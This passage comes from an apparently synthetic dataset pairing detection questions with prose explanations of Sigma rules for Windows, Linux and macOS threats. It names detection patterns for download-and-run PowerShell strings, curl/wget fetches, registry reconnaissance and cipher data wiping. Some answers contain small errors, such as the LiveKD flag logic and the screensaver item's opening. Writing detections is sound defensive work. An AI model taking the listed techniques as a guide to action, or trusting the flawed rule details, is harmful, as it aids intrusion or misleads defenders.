    "output": "In order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "default \"UserName\" used by the DiagTrackEoP POC",
      "answer": "In order to detect the default \"UserName\" used by the DiagTrackEoP POC, you should monitor the security logs on Windows systems for specific activity patterns that match an attacker exploiting this point of compromise. Focus on scrutinizing events with the EventID 4624, which represents successful account logon events. Specifically, look for instances where the LogonType is set to 9, indicating a NewCredentials logon type, such as those used by runas with /netonly or by a Scheduled Task. An especially critical flag for this detection is the use of the TargetOutboundUserName set to 'thisisnotvaliduser'. This username is a distinct indicator of suspicious activity related to the DiagTrackEoP proof of concept (POC) attack. Given the nature of this detection, false positives are considered unlikely, and such events should be treated with a high level of scrutiny as they can indicate critical security breaches aligned with tactics and techniques observed in sophisticated cyber attacks."
    }
  },
  {
    "instruction": "Please help me detect the following: remote RPC calls to possibly abuse remote encryption service via MS-EFSR",
    "context": "",
    "output": "Sure!\nIn order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should monitor application logs, specifically focusing on those generated by an RPC firewall. The detection should center on identifying specific events within the RPC Firewall (RPCFW) event logs, notably those marked with Event ID 3. These events are of particular interest when they involve the interface UUID 367abb81-9844-35f1-ad32-98f038001003, which is associated with remote procedure calls to the encryption service. This monitoring is based on applying an RPC firewall to all processes and configuring it with options to audit and block activities based on this identifier. It's important to note that while this detection strategy is set to a high level of sensitivity, legitimate administrative tasks performed on remote services might trigger false positives. Therefore, while these detections are crucial for identifying potential abuse of the encryption service, a careful analysis of flagged activities is necessary to distinguish between malicious actions and routine administrative operations.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote RPC calls to possibly abuse remote encryption service via MS-EFSR",
      "answer": "In order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should monitor application logs, specifically focusing on those generated by an RPC firewall. The detection should center on identifying specific events within the RPC Firewall (RPCFW) event logs, notably those marked with Event ID 3. These events are of particular interest when they involve the interface UUID 367abb81-9844-35f1-ad32-98f038001003, which is associated with remote procedure calls to the encryption service. This monitoring is based on applying an RPC firewall to all processes and configuring it with options to audit and block activities based on this identifier. It's important to note that while this detection strategy is set to a high level of sensitivity, legitimate administrative tasks performed on remote services might trigger false positives. Therefore, while these detections are crucial for identifying potential abuse of the encryption service, a careful analysis of flagged activities is necessary to distinguish between malicious actions and routine administrative operations."
    }
  },
  {
    "instruction": "How can I detect: installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s",
    "context": "",
    "output": "In order to detect installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s, you should: monitor process creation logs on Linux systems for instances where processes ending with '/update-ca-certificates' or '/update-ca-trust' are started. This activity could indicate that new certificates are being installed on the system, which might be an attempt by attackers to prevent security warnings when establishing connections to malicious web servers or command and control servers (C2s). It's important to note that such process activity can also occur during legitimate administration activities, so the detection level is considered low, suggesting that further investigation is warranted to confirm malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s",
      "answer": "In order to detect installation of new certificate on the system which attackers may use to avoid warnings when connecting to controlled web servers or C2s, you should: monitor process creation logs on Linux systems for instances where processes ending with '/update-ca-certificates' or '/update-ca-trust' are started. This activity could indicate that new certificates are being installed on the system, which might be an attempt by attackers to prevent security warnings when establishing connections to malicious web servers or command and control servers (C2s). It's important to note that such process activity can also occur during legitimate administration activities, so the detection level is considered low, suggesting that further investigation is warranted to confirm malicious intent."
    }
  },
  {
    "instruction": "Can you explain how to detect: potential PowerShell commands or code within registry run keys",
    "context": "",
    "output": "Certainly!\n\nIn order to detect potential PowerShell commands or code within registry run keys, you should monitor Windows registry settings specifically for changes, with a focus on those registry keys that control programs which automatically execute when a user logs into a system. The emphasis is on monitoring the registry's \"SetValue\" event types, particularly those affecting the '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' paths, which also include \"RunOnce\" and \"RunOnceEx\" registry keys. These keys are of interest because they are commonly used by attackers to achieve persistence by ensuring malicious scripts or programs are executed every time the system starts.\n\nDetection should zero in on modifications that include specific PowerShell-related strings within the details of the registry modification. This includes, but is not limited to, instances where PowerShell ('powershell', 'pwsh') is invoked, especially in combination with flags and methods designed to hide the execution window, bypass execution policies, or execute encoded commands. Some key indicators include the presence of strings such as 'FromBase64String', DownloadFile', 'DownloadString', 'Invoke-Expression', 'IEX (', 'Invoke-Command', and 'Invoke-WebRequest'. These can be indicative of attempts to download and execute malicious code from external sources or to execute encoded scripts that are hard to detect through conventional means.\n\nHowever, it's important to consider the potential for false positives, as legitimate administrative scripts or third-party tools may also use similar methods for benign purposes. Establishing a baseline of normal registry and PowerShell usage within your environment will be crucial in distinguishing between malicious activities and legitimate administrative tasks. The level of concern for these detected activities is medium, which implies that while they are not definitively malicious on their own, they warrant further investigation due to their potential misuse by attackers for persistence, script execution, or other unauthorized activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential PowerShell commands or code within registry run keys",
      "answer": "In order to detect potential PowerShell commands or code within registry run keys, you should monitor Windows registry settings specifically for changes, with a focus on those registry keys that control programs which automatically execute when a user logs into a system. The emphasis is on monitoring the registry's \"SetValue\" event types, particularly those affecting the '\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' paths, which also include \"RunOnce\" and \"RunOnceEx\" registry keys. These keys are of interest because they are commonly used by attackers to achieve persistence by ensuring malicious scripts or programs are executed every time the system starts.\n\nDetection should zero in on modifications that include specific PowerShell-related strings within the details of the registry modification. This includes, but is not limited to, instances where PowerShell ('powershell', 'pwsh') is invoked, especially in combination with flags and methods designed to hide the execution window, bypass execution policies, or execute encoded commands. Some key indicators include the presence of strings such as 'FromBase64String', DownloadFile', 'DownloadString', 'Invoke-Expression', 'IEX (', 'Invoke-Command', and 'Invoke-WebRequest'. These can be indicative of attempts to download and execute malicious code from external sources or to execute encoded scripts that are hard to detect through conventional means.\n\nHowever, it's important to consider the potential for false positives, as legitimate administrative scripts or third-party tools may also use similar methods for benign purposes. Establishing a baseline of normal registry and PowerShell usage within your environment will be crucial in distinguishing between malicious activities and legitimate administrative tasks. The level of concern for these detected activities is medium, which implies that while they are not definitively malicious on their own, they warrant further investigation due to their potential misuse by attackers for persistence, script execution, or other unauthorized activities."
    }
  },
  {
    "instruction": "Please help me detect the following: remote RPC calls to collect information",
    "context": "",
    "output": "Sure!\nIn order to detect remote RPC calls to collect information, you should focus on monitoring and analyzing specific events captured by the RPC Firewall applied to all processes. Ensure that the RPC Firewall is installed and properly configured to audit and block activities as per the given specification, particularly for the unique UUID 338cd001-2244-31f1-aaaa-900038001003. Specifically, look for events in the RPCFW EventLog with an EventID of 3, which implies an invocation to the interface with the UUID mentioned above.\n\nHowever, it's crucial to apply a filter to exclude certain operation numbers (OpNums) such as 6, 7, 8, 13, 18, 19, 21, 22, 23, and 35 from triggering alerts. These OpNums should be considered as normal activities or potential remote administration of registry values, which are identified as common false positives. Therefore, an event matching the criteria but involving these specific OpNums should not be considered suspicious.\n\nThis detection mechanism targets identifying unauthorized information gathering attempts through remote procedure calls (RPCs), which could indicate reconnaissance activities by an attacker. Given the high sensitivity level of this detection, it's essential to monitor for these indicators accurately to mitigate potential security risks efficiently.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "remote RPC calls to collect information",
      "answer": "In order to detect remote RPC calls to collect information, you should focus on monitoring and analyzing specific events captured by the RPC Firewall applied to all processes. Ensure that the RPC Firewall is installed and properly configured to audit and block activities as per the given specification, particularly for the unique UUID 338cd001-2244-31f1-aaaa-900038001003. Specifically, look for events in the RPCFW EventLog with an EventID of 3, which implies an invocation to the interface with the UUID mentioned above.\n\nHowever, it's crucial to apply a filter to exclude certain operation numbers (OpNums) such as 6, 7, 8, 13, 18, 19, 21, 22, 23, and 35 from triggering alerts. These OpNums should be considered as normal activities or potential remote administration of registry values, which are identified as common false positives. Therefore, an event matching the criteria but involving these specific OpNums should not be considered suspicious.\n\nThis detection mechanism targets identifying unauthorized information gathering attempts through remote procedure calls (RPCs), which could indicate reconnaissance activities by an attacker. Given the high sensitivity level of this detection, it's essential to monitor for these indicators accurately to mitigate potential security risks efficiently."
    }
  },
  {
    "instruction": "Please help me detect the following: HTTP requests used by Chafer malware",
    "context": "",
    "output": "Sure!\nIn order to Detects HTTP requests used by Chafer malware, you should: Focus on monitoring network proxy logs to identify any HTTP requests that contain the specific pattern '/asp.asp?ui=' within the request URI. This pattern is indicative of activities associated with the Chafer malware. When such a request is detected, it's important to capture and review the client IP address, the full request URI, and the client's user agent string, as these pieces of information can be critical in further analysis and investigation of the potential compromise. Given the critical nature of this detection, it implies that occurrences might not have benign explanations and should be treated with high priority to mitigate the associated security risk.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "HTTP requests used by Chafer malware",
      "answer": "In order to Detects HTTP requests used by Chafer malware, you should: Focus on monitoring network proxy logs to identify any HTTP requests that contain the specific pattern '/asp.asp?ui=' within the request URI. This pattern is indicative of activities associated with the Chafer malware. When such a request is detected, it's important to capture and review the client IP address, the full request URI, and the client's user agent string, as these pieces of information can be critical in further analysis and investigation of the potential compromise. Given the critical nature of this detection, it implies that occurrences might not have benign explanations and should be treated with high priority to mitigate the associated security risk."
    }
  },
  {
    "instruction": "Please help me detect the following: usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\nAdversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\nData destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\n",
    "context": "",
    "output": "Sure!\nIn order to detect usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk, where adversaries might aim to destroy data and files on specific systems or throughout a network to disrupt the availability of systems, services, and network resources, potentially making data irretrievable through overwriting files or data on both local and remote drives, you should: Look for the creation of processes in Windows where the process is specifically the built-in \"cipher\" utility. This can be identified by examining process creation logs for instances where the original file name corresponds to \"CIPHER.EXE\" or the image path ends with \"\\cipher.exe\". In addition, pay attention to the command line used to execute \"cipher.exe\", especially looking for the use of the \"/w:\" option, which is indicative of an attempt to overwrite deleted data on a disk. It is important to consider all related selections collectively to assert an accurate detection. Given the nature of this utility, be aware of potential legitimate uses, although no specific known legitimate circumstances have been preemptively identified. The severity of detecting such activity is considered medium.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk.\nAdversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources.\nData destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives\n",
      "answer": "In order to detect usage of the \"cipher\" built-in utility in order to overwrite deleted data from disk, where adversaries might aim to destroy data and files on specific systems or throughout a network to disrupt the availability of systems, services, and network resources, potentially making data irretrievable through overwriting files or data on both local and remote drives, you should: Look for the creation of processes in Windows where the process is specifically the built-in \"cipher\" utility. This can be identified by examining process creation logs for instances where the original file name corresponds to \"CIPHER.EXE\" or the image path ends with \"\\cipher.exe\". In addition, pay attention to the command line used to execute \"cipher.exe\", especially looking for the use of the \"/w:\" option, which is indicative of an attempt to overwrite deleted data on a disk. It is important to consider all related selections collectively to assert an accurate detection. Given the nature of this utility, be aware of potential legitimate uses, although no specific known legitimate circumstances have been preemptively identified. The severity of detecting such activity is considered medium."
    }
  },
  {
    "instruction": "Explain how should I detect the following: enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings",
    "context": "",
    "output": "In order to detect enumeration of local system groups, which adversaries may attempt to uncover local system groups and their permission settings, you should focus on process creation logs from Linux systems. Look for processes that have been launched and whose executable paths end with '/groups' as indicated in the logs. Additionally, pay attention to processes where the executable paths end with '/cat', '/head', '/tail', or '/more' combined with command lines that contain '/etc/group'. This condition suggests attempts to view the local system's group file, usually indicating an enumeration of local system groups. Bear in mind that there could be false positives, such as legitimate administration activities which might involve similar commands for routine system checks or configurations. This detection strategy has been classified at a low level, acknowledging that while this behavior can indicate adversarial activity, it might also reflect ordinary system administration tasks.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "enumeration of local system groups. Adversaries may attempt to find local system groups and permission settings",
      "answer": "In order to detect enumeration of local system groups, which adversaries may attempt to uncover local system groups and their permission settings, you should focus on process creation logs from Linux systems. Look for processes that have been launched and whose executable paths end with '/groups' as indicated in the logs. Additionally, pay attention to processes where the executable paths end with '/cat', '/head', '/tail', or '/more' combined with command lines that contain '/etc/group'. This condition suggests attempts to view the local system's group file, usually indicating an enumeration of local system groups. Bear in mind that there could be false positives, such as legitimate administration activities which might involve similar commands for routine system checks or configurations. This detection strategy has been classified at a low level, acknowledging that while this behavior can indicate adversarial activity, it might also reflect ordinary system administration tasks."
    }
  },
  {
    "instruction": "How can I detect: execution of LiveKD with the \"-m\" flag to potentially dump the kernel memory",
    "context": "",
    "output": "In order to detect execution of LiveKD with the \"-m\" flag to potentially dump the kernel memory, you should: Monitor process creation events within Windows environments for instances where the process image name ends with '\\livekd.exe' or '\\livekd64.exe', or where 'livekd.exe' is specified as the OriginalFileName. Furthermore, ensure to check if the command line arguments contain both ' /m' and ' -m' simultaneously. This detection approach is highly specific and unlikely to generate false positives in a production environment, indicating a high level of confidence in identifying potential malicious activity associated with kernel memory dumping.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of LiveKD with the \"-m\" flag to potentially dump the kernel memory",
      "answer": "In order to detect execution of LiveKD with the \"-m\" flag to potentially dump the kernel memory, you should: Monitor process creation events within Windows environments for instances where the process image name ends with '\\livekd.exe' or '\\livekd64.exe', or where 'livekd.exe' is specified as the OriginalFileName. Furthermore, ensure to check if the command line arguments contain both ' /m' and ' -m' simultaneously. This detection approach is highly specific and unlikely to generate false positives in a production environment, indicating a high level of confidence in identifying potential malicious activity associated with kernel memory dumping."
    }
  },
  {
    "instruction": "Can you explain how to detect: usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software, you should: Focus on monitoring process creation events within Windows environments. Specifically, look out for instances where the process named \"reg.exe\" is initiated, indicated by its image name ending with '\\reg.exe' or the process having the original file name 'reg.exe'. Additionally, examine the command line arguments tied to these processes for the presence of the 'query' operation. This operation is a strong indicator that an adversary is attempting to gather intelligence. Pay special attention to queries targeting specific registry keys known to store sensitive information. These include keys related to current Windows version details, login procedures, software startup configurations, policy settings, and service configurations. The targeted registry paths are 'currentVersion\\windows', 'winlogon\\', 'currentVersion\\shellServiceObjectDelayLoad', 'currentVersion\\run' (along with variations like \"RunOnce\", \"RunOnceEx\", and \"runServicesOnce\"), 'currentVersion\\policies\\explorer\\run', and 'currentcontrolset\\services'. The appearance of command line actions targeting these registry areas, in conjunction with the use of 'reg.exe', serves as a potential indicator of malicious reconnaissance activity aiming to extract valuable system, configuration, or credential information.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software.",
      "answer": "In order to detect the usage of \"reg.exe\" in order to query reconnaissance information from the registry. Adversaries may interact with the Windows registry to gather information about credentials, the system, configuration, and installed software, you should: Focus on monitoring process creation events within Windows environments. Specifically, look out for instances where the process named \"reg.exe\" is initiated, indicated by its image name ending with '\\reg.exe' or the process having the original file name 'reg.exe'. Additionally, examine the command line arguments tied to these processes for the presence of the 'query' operation. This operation is a strong indicator that an adversary is attempting to gather intelligence. Pay special attention to queries targeting specific registry keys known to store sensitive information. These include keys related to current Windows version details, login procedures, software startup configurations, policy settings, and service configurations. The targeted registry paths are 'currentVersion\\windows', 'winlogon\\', 'currentVersion\\shellServiceObjectDelayLoad', 'currentVersion\\run' (along with variations like \"RunOnce\", \"RunOnceEx\", and \"runServicesOnce\"), 'currentVersion\\policies\\explorer\\run', and 'currentcontrolset\\services'. The appearance of command line actions targeting these registry areas, in conjunction with the use of 'reg.exe', serves as a potential indicator of malicious reconnaissance activity aiming to extract valuable system, configuration, or credential information."
    }
  },
  {
    "instruction": "Can you explain how to detect: suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents",
    "context": "",
    "output": "Certainly!\n\nIn order to detect suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents, you should monitor process creation logs on Windows systems for the activation of specific utilities or commands indicative of file downloads. Specifically, look for instances where the image name ends with '\\curl.exe' or '\\wget.exe', or where the command line includes phrases such as 'Invoke-WebRequest', 'iwr ', 'curl ', 'wget ', or 'Start-BitsTransfer'. Additionally, monitor for use of '.DownloadFile(' or '.DownloadString(' in command lines, which are methods often used in PowerShell scripting to download files from the internet. Attention should also be focused on commands that contain URLs pointing to 'https://attachment.outlook.live.net/owa/' or 'https://onenoteonlinesync.onenote.com/onenoteonlinesync/', as these are Microsoft domains hosting attachments for Emails and OneNote documents. It's important to be aware that there could be legitimate scripts or tools designed to download attachments from these domains, and these should be considered as potential false positives. This detection approach is highly relevant for identifying activities that may involve unauthorized downloading of sensitive documents or data exfiltration attempts through trusted Microsoft services.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents",
      "answer": "In order to detect suspicious ways to download files from Microsoft domains that are used to store attachments in Emails or OneNote documents, you should monitor process creation logs on Windows systems for the activation of specific utilities or commands indicative of file downloads. Specifically, look for instances where the image name ends with '\\curl.exe' or '\\wget.exe', or where the command line includes phrases such as 'Invoke-WebRequest', 'iwr ', 'curl ', 'wget ', or 'Start-BitsTransfer'. Additionally, monitor for use of '.DownloadFile(' or '.DownloadString(' in command lines, which are methods often used in PowerShell scripting to download files from the internet. Attention should also be focused on commands that contain URLs pointing to 'https://attachment.outlook.live.net/owa/' or 'https://onenoteonlinesync.onenote.com/onenoteonlinesync/', as these are Microsoft domains hosting attachments for Emails and OneNote documents. It's important to be aware that there could be legitimate scripts or tools designed to download attachments from these domains, and these should be considered as potential false positives. This detection approach is highly relevant for identifying activities that may involve unauthorized downloading of sensitive documents or data exfiltration attempts through trusted Microsoft services."
    }
  },
  {
    "instruction": "How can I detect: Detect suspicious parent processes of well-known Windows processes",
    "context": "",
    "output": "In order to detect suspicious parent processes of well-known Windows processes, you should monitor the creation of processes on Windows systems, specifically focusing on the inception of critical system processes like svchost.exe, taskhost.exe, lsm.exe, lsass.exe, services.exe, lsaiso.exe, csrss.exe, wininit.exe, and winlogon.exe. It's crucial to examine the parent process of these system processes. If the parent process does not originate from expected system directories like System32 or SysWOW64, or from known security products' executables such as Windows Defender (MsMpEng.exe), Sophos Anti-Virus Service (SavService.exe), or NGen (ngen.exe), the activity may be considered suspicious. This approach aims to identify anomalies in the execution path of Windows critical processes, which could indicate a potential security breach or malicious activity by imitating system processes to remain undetected in the system. Be aware that some legitimate security products might also spawn these processes, which could result in false positives and therefore such occurrences should be carefully investigated to ascertain their legitimacy. This detection strategy is associated with tactics and techniques such as Privilege Escalation and Persistence by exploiting system processes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detect suspicious parent processes of well-known Windows processes",
      "answer": "In order to detect suspicious parent processes of well-known Windows processes, you should monitor the creation of processes on Windows systems, specifically focusing on the inception of critical system processes like svchost.exe, taskhost.exe, lsm.exe, lsass.exe, services.exe, lsaiso.exe, csrss.exe, wininit.exe, and winlogon.exe. It's crucial to examine the parent process of these system processes. If the parent process does not originate from expected system directories like System32 or SysWOW64, or from known security products' executables such as Windows Defender (MsMpEng.exe), Sophos Anti-Virus Service (SavService.exe), or NGen (ngen.exe), the activity may be considered suspicious. This approach aims to identify anomalies in the execution path of Windows critical processes, which could indicate a potential security breach or malicious activity by imitating system processes to remain undetected in the system. Be aware that some legitimate security products might also spawn these processes, which could result in false positives and therefore such occurrences should be carefully investigated to ascertain their legitimacy. This detection strategy is associated with tactics and techniques such as Privilege Escalation and Persistence by exploiting system processes."
    }
  },
  {
    "instruction": "How to detect: potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
    "context": "",
    "output": "In order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should: Monitor process creation events on Windows systems for instances of the Remote Desktop Protocol (RDP) client process, mstsc.exe, being initiated. Specifically, look for the executable image name ending with '\\mstsc.exe' or where the OriginalFileName attribute is 'mstsc.exe'. Additionally, pay close attention to the command line arguments of these processes, especially focusing on instances where the command line ends with a reference to a '.rdp' file, indicating the use of a local RDP configuration file for the connection. Such '.rdp' files should raise suspicion if they are located in certain directories that are uncommon for legitimate RDP file storage. These directories include various system and temporary file paths such as ':\\Users\\Public\\', ':\\Windows\\System32\\spool\\drivers\\color', ':\\Windows\\System32\\Tasks_Migrated', ':\\Windows\\Tasks\\', ':\\Windows\\Temp\\', ':\\Windows\\Tracing\\', '\\AppData\\Local\\Temp\\', and '\\Downloads\\'. Monitoring for RDP connections initiated from or involving these paths can be critical for identifying unauthorized remote access attempts. However, it's important to adjust the scrutiny of these detection criteria based on the legitimate use of these paths in your environment, as the likelihood of false positives can vary. The detection of such activities is associated with high concern due to the potential for misuse in tactics like lateral movement and persistence.\n\nThis approach encapsulates the concept of monitoring for suspicious behavior associated with RDP usage, aiming to uncover potentially malicious activities attempting to exploit remote desktop protocols for unauthorized access or control within a Windows environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations.",
      "answer": "In order to detect potential RDP connection via Mstsc using a local \".rdp\" file located in suspicious locations, you should: Monitor process creation events on Windows systems for instances of the Remote Desktop Protocol (RDP) client process, mstsc.exe, being initiated. Specifically, look for the executable image name ending with '\\mstsc.exe' or where the OriginalFileName attribute is 'mstsc.exe'. Additionally, pay close attention to the command line arguments of these processes, especially focusing on instances where the command line ends with a reference to a '.rdp' file, indicating the use of a local RDP configuration file for the connection. Such '.rdp' files should raise suspicion if they are located in certain directories that are uncommon for legitimate RDP file storage. These directories include various system and temporary file paths such as ':\\Users\\Public\\', ':\\Windows\\System32\\spool\\drivers\\color', ':\\Windows\\System32\\Tasks_Migrated', ':\\Windows\\Tasks\\', ':\\Windows\\Temp\\', ':\\Windows\\Tracing\\', '\\AppData\\Local\\Temp\\', and '\\Downloads\\'. Monitoring for RDP connections initiated from or involving these paths can be critical for identifying unauthorized remote access attempts. However, it's important to adjust the scrutiny of these detection criteria based on the legitimate use of these paths in your environment, as the likelihood of false positives can vary. The detection of such activities is associated with high concern due to the potential for misuse in tactics like lateral movement and persistence.\n\nThis approach encapsulates the concept of monitoring for suspicious behavior associated with RDP usage, aiming to uncover potentially malicious activities attempting to exploit remote desktop protocols for unauthorized access or control within a Windows environment."
    }
  },
  {
    "instruction": "Can you explain how to detect: Sysmon registry detection of a local hidden user account.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect the creation or manipulation of a local hidden user account via Sysmon registry events, you should monitor Windows registry event logs for actions targeting registry keys related to user accounts, specifically those that occur within the path `\\SAM\\SAM\\Domains\\Account\\Users\\Names\\`. Focus on entries where the target object either contains this path or ends with a `$` symbol, indicating hidden or system accounts. Additionally, give special attention to events generated by the image `lsass.exe` as this binary is often associated with local security authority processes and could be indicative of malicious activity aimed at manipulating user accounts. Despite the potential for unknown false positives, this activity is deemed to have a high level of concern due to its implications for system security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Sysmon registry detection of a local hidden user account.",
      "answer": "In order to detect the creation or manipulation of a local hidden user account via Sysmon registry events, you should monitor Windows registry event logs for actions targeting registry keys related to user accounts, specifically those that occur within the path `\\SAM\\SAM\\Domains\\Account\\Users\\Names\\`. Focus on entries where the target object either contains this path or ends with a `$` symbol, indicating hidden or system accounts. Additionally, give special attention to events generated by the image `lsass.exe` as this binary is often associated with local security authority processes and could be indicative of malicious activity aimed at manipulating user accounts. Despite the potential for unknown false positives, this activity is deemed to have a high level of concern due to its implications for system security."
    }
  },
  {
    "instruction": "Please help me detect the following: suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks",
    "context": "",
    "output": "Sure!\nIn order to detect suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows running all subprocesses of that newly started explorer.exe without any UAC checks, you should: focus on monitoring process creation logs within a Windows environment. Specifically, look for instances where the process image ends with '\\explorer.exe' and the command line includes the flag '/NOUACCHECK'. It's important to exclude events where the parent command line is 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule' or the parent image is 'C:\\Windows\\System32\\svchost.exe', as these are associated with domain controller user logon and may generate false positives. This detection identifies a high-severity security risk, however, please be aware that there might be legitimate software products that use this method, which could also trigger this alert.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows to run all sub processes of that newly started explorer.exe without any UAC checks",
      "answer": "In order to detect suspicious starts of explorer.exe that use the /NOUACCHECK flag that allows running all subprocesses of that newly started explorer.exe without any UAC checks, you should: focus on monitoring process creation logs within a Windows environment. Specifically, look for instances where the process image ends with '\\explorer.exe' and the command line includes the flag '/NOUACCHECK'. It's important to exclude events where the parent command line is 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule' or the parent image is 'C:\\Windows\\System32\\svchost.exe', as these are associated with domain controller user logon and may generate false positives. This detection identifies a high-severity security risk, however, please be aware that there might be legitimate software products that use this method, which could also trigger this alert."
    }
  },
  {
    "instruction": "How can I detect: Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
    "context": "",
    "output": "In order to establish persistence by executing malicious content triggered by user inactivity specifically through screensavers, which are programs that run after a period of user inactivity and consist of Portable Executable (PE) files with a .scr file extension, you should: detect when a file with a '.scr' extension is created or modified on Windows systems. However, it is important to exclude certain benign files from triggering alerts. Specifically, ignore files if they are associated with 'Kindle.exe' or 'ccSvcHst.exe', which is related to Symantec Endpoint Protection, to reduce false positives. Also, ignore occurrences involving 'TiWorker.exe' with a target filename of 'uwfservicingscr.scr', as this might be part of a legitimate system process. This approach aims to balance sensitivity and specificity, maintaining vigilance for potential threats without overwhelming security teams with false alarms. The detection operates under a medium level of alert, indicating a notable risk that requires attention without assuming an immediate critical threat.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.\nScreensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension\n",
      "answer": "In order to establish persistence by executing malicious content triggered by user inactivity specifically through screensavers, which are programs that run after a period of user inactivity and consist of Portable Executable (PE) files with a .scr file extension, you should: detect when a file with a '.scr' extension is created or modified on Windows systems. However, it is important to exclude certain benign files from triggering alerts. Specifically, ignore files if they are associated with 'Kindle.exe' or 'ccSvcHst.exe', which is related to Symantec Endpoint Protection, to reduce false positives. Also, ignore occurrences involving 'TiWorker.exe' with a target filename of 'uwfservicingscr.scr', as this might be part of a legitimate system process. This approach aims to balance sensitivity and specificity, maintaining vigilance for potential threats without overwhelming security teams with false alarms. The detection operates under a medium level of alert, indicating a notable risk that requires attention without assuming an immediate critical threat."
    }
  },
  {
    "instruction": "How to detect: usage of base64 utility to decode arbitrary base64-encoded text",
    "context": "",
    "output": "In order to detect usage of base64 utility to decode arbitrary base64-encoded text, you should monitor process creation logs on macOS systems for instances where the base64 utility, located at '/usr/bin/base64', is invoked with the '-d' option in the command line. This activity is indicative of decoding operations being performed, which could be legitimate or malicious depending on the context. However, given the common use of base64 decoding in various benign scenarios, the likelihood of false positives is considered low, suggesting a cautious approach in interpreting the detection.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of base64 utility to decode arbitrary base64-encoded text",
      "answer": "In order to detect usage of base64 utility to decode arbitrary base64-encoded text, you should monitor process creation logs on macOS systems for instances where the base64 utility, located at '/usr/bin/base64', is invoked with the '-d' option in the command line. This activity is indicative of decoding operations being performed, which could be legitimate or malicious depending on the context. However, given the common use of base64 decoding in various benign scenarios, the likelihood of false positives is considered low, suggesting a cautious approach in interpreting the detection."
    }
  },
  {
    "instruction": "Explain how should I detect the following: execution of PowerShell via creation of named pipe starting with PSHost",
    "context": "",
